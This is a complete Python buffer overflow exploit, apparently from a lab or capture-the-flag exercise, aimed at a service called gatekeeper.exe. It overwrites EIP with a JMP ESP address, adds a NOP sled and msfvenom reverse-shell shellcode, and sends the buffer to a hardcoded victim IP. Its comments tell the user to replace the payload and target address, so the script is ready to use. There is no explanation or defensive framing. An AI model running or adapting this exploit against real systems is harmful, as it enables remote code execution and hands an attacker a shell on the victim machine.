#!/usr/bin/python3

"""
A buffer overflow exploit for the custom gatekeeper.exe service.

Before using this exploit, replace the shellcode with your own payload
and change the victim IP address.
"""

import socket

print("\nSending evil buffer...")

filler = b"\x41" * 146
eip = b"\xc3\x14\x04\x08" # JMP ESP instruction in gatekeeper.exe
nops = b"\x90" * 10 # NOP sled
# msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=80 -e x86/shikata_ga_nai -b "\x00\x0a" -f py -v shellcode
shellcode =  b""
shellcode += b"\xb8\xdd\xd2\x68\x1c\xda\xd4\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x52\x31\x42\x12\x83\xea\xfc"
shellcode += b"\x03\x9f\xdc\x8a\xe9\xe3\x09\xc8\x12\x1b\xca"
shellcode += b"\xad\x9b\xfe\xfb\xed\xf8\x8b\xac\xdd\x8b\xd9"
shellcode += b"\x40\x95\xde\xc9\xd3\xdb\xf6\xfe\x54\x51\x21"
shellcode += b"\x31\x64\xca\x11\x50\xe6\x11\x46\xb2\xd7\xd9"
shellcode += b"\x9b\xb3\x10\x07\x51\xe1\xc9\x43\xc4\x15\x7d"
shellcode += b"\x19\xd5\x9e\xcd\x8f\x5d\x43\x85\xae\x4c\xd2"
shellcode += b"\x9d\xe8\x4e\xd5\x72\x81\xc6\xcd\x97\xac\x91"
shellcode += b"\x66\x63\x5a\x20\xae\xbd\xa3\x8f\x8f\x71\x56"
shellcode += b"\xd1\xc8\xb6\x89\xa4\x20\xc5\x34\xbf\xf7\xb7"
shellcode += b"\xe2\x4a\xe3\x10\x60\xec\xcf\xa1\xa5\x6b\x84"
shellcode += b"\xae\x02\xff\xc2\xb2\x95\x2c\x79\xce\x1e\xd3"
shellcode += b"\xad\x46\x64\xf0\x69\x02\x3e\x99\x28\xee\x91"
shellcode += b"\xa6\x2a\x51\x4d\x03\x21\x7c\x9a\x3e\x68\xe9"
shellcode += b"\x6f\x73\x92\xe9\xe7\x04\xe1\xdb\xa8\xbe\x6d"
shellcode += b"\x50\x20\x19\x6a\x97\x1b\xdd\xe4\x66\xa4\x1e"
shellcode += b"\x2d\xad\xf0\x4e\x45\x04\x79\x05\x95\xa9\xac"
shellcode += b"\x8a\xc5\x05\x1f\x6b\xb5\xe5\xcf\x03\xdf\xe9"
shellcode += b"\x30\x33\xe0\x23\x59\xde\x1b\xa4\x6c\x19\x25"
shellcode += b"\x7d\x19\x27\x29\x7d\x89\xae\xcf\x17\x39\xe7"
shellcode += b"\x58\x80\xa0\xa2\x12\x31\x2c\x79\x5f\x71\xa6"
shellcode += b"\x8e\xa0\x3c\x4f\xfa\xb2\xa9\xbf\xb1\xe8\x7c"
shellcode += b"\xbf\x6f\x84\xe3\x52\xf4\x54\x6d\x4f\xa3\x03"
shellcode += b"\x3a\xa1\xba\xc1\xd6\x98\x14\xf7\x2a\x7c\x5e"
shellcode += b"\xb3\xf0\xbd\x61\x3a\x74\xf9\x45\x2c\x40\x02"
shellcode += b"\xc2\x18\x1c\x55\x9c\xf6\xda\x0f\x6e\xa0\xb4"
shellcode += b"\xfc\x38\x24\x40\xcf\xfa\x32\x4d\x1a\x8d\xda"
shellcode += b"\xfc\xf3\xc8\xe5\x31\x94\xdc\x9e\x2f\x04\x22"
shellcode += b"\x75\xf4\x34\x69\xd7\x5d\xdd\x34\x82\xdf\x80"
shellcode += b"\xc6\x79\x23\xbd\x44\x8b\xdc\x3a\x54\xfe\xd9"
shellcode += b"\x07\xd2\x13\x90\x18\xb7\x13\x07\x18\x92"
buffer = filler + eip + nops + shellcode + b"\x0a"
# end the buffer with \x0a linefeed character to end input

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# change the victim ip as necessary
s.connect(("10.10.47.35", 31337))
s.send(buffer)

s.close()

print("\nDone!")